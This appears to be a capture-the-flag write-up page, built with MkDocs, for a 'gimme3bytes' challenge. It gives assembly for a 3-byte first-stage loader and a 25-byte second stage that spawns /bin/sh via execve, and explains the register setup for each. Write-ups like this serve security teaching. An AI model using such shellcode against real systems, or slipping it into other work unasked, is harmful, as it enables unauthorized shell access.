@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>gimme3bytes - Cyberchallenge Writeups</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <link href="../../css/custom-styles.css" rel="stylesheet">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "gimme3bytes", url: "#_top", children: [
+              {title: "First Stage (3 bytes)", url: "#first-stage-3-bytes" },
+              {title: "Second Stage (25 bytes)", url: "#second-stage-25-bytes" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../tiny/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../tiny/" class="btn btn-xs btn-link">
+        tiny
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../onlyreadwrite/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../onlyreadwrite/" class="btn btn-xs btn-link">
+        onlyreadwrite
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="gimme3bytes">gimme3bytes</h1>
+<p>It reads 3 bytes from stdin and executes them as shellcode.</p>
+<p>The idea is to run a multi-stage shellcode, where the first stage is a small shellcode that call the syscall <code>read</code> to read the second stage from stdin. The second stage is the actual shellcode that will be executed.</p>
+<h2 id="first-stage-3-bytes">First Stage (3 bytes)</h2>
+<pre><code class="language-c">pop rdx
+syscall
+</code></pre>
+<ul>
+<li>RAX: already set to 0x0a (syscall number for <code>read</code>)</li>
+<li>RDI: already set to 0x0 (stdin)</li>
+<li>RSI: already set to the buffer address</li>
+<li>RDX: set using <code>pop rdx</code>. Why so? Because at that point the stack contains a large number that can be used as a buffer size</li>
+</ul>
+<h2 id="second-stage-25-bytes">Second Stage (25 bytes)</h2>
+<p>Main idea: <code>execve(RDI -&gt; "/bin/sh", RSI = argv -&gt; NULL, RDX = envp -&gt; NULL)</code></p>
+<pre><code class="language-c">nop
+nop
+nop
+mov rdi, rsi
+add rdi, 0x19
+mov rax, 0x3b
+xor rsi, rsi
+xor rdx, rdx
+syscall
+.string &quot;/bin/sh&quot;
+</code></pre>
+<p>Note: The first three <code>nop</code>s are there since the RIP after the first stage is set at the end of the buffer and cannot be changed. With the three <code>nop</code>s we push the second stage three bytes forward right where the RIP will be set and then <code>mov rdi, rsi</code> will be the first instruction executed.</p>
+<ul>
+<li>RDI: set to the buffer address + 25, to point to the string "/bin/sh"</li>
+<li>RAX: set to 0x3b (syscall number for <code>execve</code>)</li>
+<li>RSI: set to 0x0 (NULL)</li>
+<li>RDX: set to 0x0 (NULL)</li>
+</ul>
+<p>The complete exploit is in <a href="script.py">script.py</a>.</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../tiny/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../tiny/" class="btn btn-xs btn-link">
+        tiny
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../onlyreadwrite/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../onlyreadwrite/" class="btn btn-xs btn-link">
+        onlyreadwrite
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/gio-del/ODC-Challenges-CTF/edit/main/shellcode/gimme3bytes/README.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gio-del/ODC-Challenges-CTF">Windmill Dark</a> theme by None (noraj).</p>
+</footer>
+
+</body>
+</html>
